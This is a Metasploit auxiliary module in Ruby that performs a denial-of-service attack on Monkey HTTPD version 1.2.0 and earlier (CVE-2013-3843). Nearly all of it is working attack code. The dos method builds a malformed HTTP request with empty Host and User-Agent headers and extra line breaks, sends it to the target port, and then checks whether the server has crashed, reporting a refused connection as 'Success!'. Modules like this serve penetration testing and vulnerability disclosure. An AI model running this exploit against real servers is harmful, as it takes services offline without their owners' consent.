##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Monkey HTTPD Header Parsing Denial of Service (DoS)',
      'Description'    => %q{
          This module causes improper header parsing that leads to a segmentation fault
        due to a specially crafted HTTP request. Affects version <= 1.2.0.
      },
      'Author'         =>
        [
          'Doug Prostko <dougtko[at]gmail.com>'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2013-3843'],
          ['OSVDB', '93853'],
          ['BID', '60333'],
          ['URL', 'http://bugs.monkey-project.com/ticket/182']
        ],
      'DisclosureDate' => 'May 30 2013'))

    register_options(
      [
        Opt::RPORT(2001)
      ], self.class)
  end

  def dos
    req = "GET / HTTP/1.1\r\n"
    req << "Host:\r\n\r\nlocalhost\r\n"
    req << "User-Agent:\r\n\r\n"

    connect
    sock.put(req)
    disconnect
  end

  def is_alive?
    begin
      connect
    rescue Rex::ConnectionRefused
      return false
    ensure
      disconnect
    end

    true
  end

  def run
    print_status("#{rhost}:#{rport} - Sending DoS packet...")
    dos

    print_status("#{rhost}:#{rport} - Checking server status...")
    select(nil, nil, nil, 1)

    if is_alive?
      print_error("#{rhost}:#{rport} - Server is still alive")
    else
      print_good("#{rhost}:#{rport} - Connection Refused: Success!")
    end
  end
end
